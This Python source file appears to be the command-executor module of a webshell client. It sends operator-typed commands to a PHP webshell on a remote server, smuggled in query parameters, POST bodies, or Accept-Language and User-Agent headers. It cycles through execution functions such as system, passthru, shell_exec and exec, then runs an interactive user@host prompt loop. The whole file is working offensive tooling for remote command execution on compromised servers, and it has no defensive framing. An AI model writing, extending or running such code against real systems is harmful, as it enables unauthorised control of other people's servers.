import sys
import asyncio
from modules.header import Headers
from modules.http import HttpRequest, HttpMethods
from modules.colors import YELLOW, RED, CLEAR, BOLD, CYAN, BLUE, PURPLE

class Executor:
    """
        Execute an HTTP GET request using the provided client, URL, command, method, and request function.

        Args:
            client (Client): The HTTP client to use for sending the request.
            url (str): The URL to send the request to.
            cmd (str): The command to append to the URL.
            method (str): The HTTP method to use for the request.
            request_func (Callable): The function to use for sending the request.

        Returns:
            The result of the request, or None if no result is available.
    """
    @staticmethod
    async def execute_http_request_get(client, url, cmd, method, request_func):
        result = await request_func(client, url + method, cmd)
        if result:
            return result
        return None

    @staticmethod
    async def execute_http_request_post(client, url, cmd, method, request_func):
        result = await request_func(client, url, method, cmd)
        if result:
            return result
        return None

    """
        Executes a given command based on the provided client, URL, command, and type.

        Args:
            client (httpx.AsyncClient): The HTTP client used for making requests.
            url (str): The URL to send the request to.
            cmd (str): The command to execute.
            type (str): The type of command to execute.

        Returns:
            str: The result of the executed command.

        Raises:
            SystemExit: If an invalid HTTP response code is received or if the URL is not reachable.

    """
    @staticmethod
    async def execute(client, url, cmd, type):
        if type in ["get", "post"]:
            headers = Headers.create()
            if type == "get":
                r = await HttpRequest.request(client, "get", url + cmd, headers)
                if r:
                    return r
                return RED + "ERROR" + CLEAR
            elif type == "post":
                r = await client.post(url, headers=headers, data=cmd)
                if r.text:
                    return r.text
                return RED + "ERROR" + CLEAR

        if type in [
            "http_aizawa_ninja_eval",
            "http_aizawa_ninja_concat",
            "http_aizawa_ninja_debug",
            "http_aizawa_ninja_gc",
            "http_aizawa_ninja_json",
            "http_aizawa_ninja_filter",
        ]:
            methods = ["system~", "passthru~", "shell_exec~", "exec~"]
            if type == "http_aizawa_ninja_eval":
                for method in methods:
                    result = await HttpMethods.http_aizawa_ninja(
                        client, url, method + cmd
                    )
                    if result:
                        return result
                return RED + "ERROR" + CLEAR
            else:
                result = await HttpMethods.http_aizawa_ninja(client, url, cmd)
                if result:
                    return result
                return RED + "ERROR" + CLEAR

        if type in ["http_accept_language_get", "http_user_agent_get"]:
            methods = [
                "?cmd=system",
                "?cmd=proc_open",
                "?cmd=popen",
                "?cmd=passthru",
                "?cmd=shell_exec",
                "?cmd=exec",
            ]
            request_func = (
                HttpMethods.http_accept_language_get
                if type == "http_accept_language_get"
                else HttpMethods.http_user_agent_get
            )
            tasks = [
                Executor.execute_http_request_get(
                    client, url, cmd, method, request_func
                )
                for method in methods
            ]
            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    return result
            return RED + "ERROR" + CLEAR

        if type in ["http_accept_language_post", "http_user_agent_post"]:
            methods = ["system", "proc_open", "popen", "passthru", "shell_exec", "exec"]
            request_func = (
                HttpMethods.http_accept_language_post
                if type == "http_accept_language_post"
                else HttpMethods.http_user_agent_post
            )
            tasks = [
                Executor.execute_http_request_post(
                    client, url, cmd, method, request_func
                )
                for method in methods
            ]
            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    return result
            return RED + "ERROR" + CLEAR
        
    """
        Executes commands entered by the user.

        Args:
            client (Client): The client object.
            url (str): The URL.
            type (str): The type.
            user (str): The username.
            host (str): The hostname.
            pwd (str): The path.

        Returns:
            Returns the result of the executed command.
    """
    @staticmethod
    async def execute_commands(client, url, type, user, host, pwd):
        while True:
            cmd = input(f"\n{BOLD}{YELLOW}{user}{CLEAR}@{BOLD}{BLUE}{host}{CLEAR} {PURPLE}{pwd}{CLEAR} % ")
            if cmd == "exit" or cmd == "quit" or cmd == "\x03":
                sys.exit(print(f"{BOLD}{RED}Exiting...{CLEAR}"))
            if not cmd:
                continue

            print(f"\n{CYAN}{await Executor.execute(client, url, cmd, type)}{CLEAR}")
